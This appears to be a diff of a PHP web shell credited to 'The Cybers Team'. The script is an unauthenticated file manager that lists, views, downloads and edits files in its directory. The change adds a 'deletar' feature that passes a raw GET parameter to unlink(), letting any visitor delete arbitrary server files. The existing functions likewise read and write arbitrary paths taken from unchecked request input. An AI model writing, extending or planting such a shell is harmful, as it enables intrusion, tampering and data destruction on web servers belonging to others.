@@ -22,10 +22,12 @@
 <?php
 /*
 	By: The Cybers Team
-	Versão: Beta 0.3
+	Versão: Beta 0.4
 	[ok] listar
+	[ok] visualizar
 	[ok] download
 	[ok] editar
+	[ok] deletar
 */
 	// Funções =======================================================
 
@@ -49,7 +51,7 @@
 				echo "<td><a href='$file'>Visualizar</a></td>";
 				echo "<td><a href='?download=$file'>Download</a></td>";
 				echo "<td><a href='?editar=$file'>Editar</a></td>";
-				echo "<td>Deletar</td>";
+				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
 				echo "</tr>";
 			}
 		}
@@ -85,6 +87,11 @@
 		fclose($fp);
 	}
 
+	function deletar($arquivo){
+		unlink($arquivo);
+	}
+
+	// POST e GET ==================================================
 	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
 		salvar($salvar,$arquivo);
 	}
@@ -96,6 +103,11 @@
 		editar($editar);
 	}
 
+	if($deletar = $_GET['deletar']){
+		deletar($deletar);
+	}
+
+	// Shell =======================================================
 	$diretorio = getcwd();
 	listar($diretorio);
 
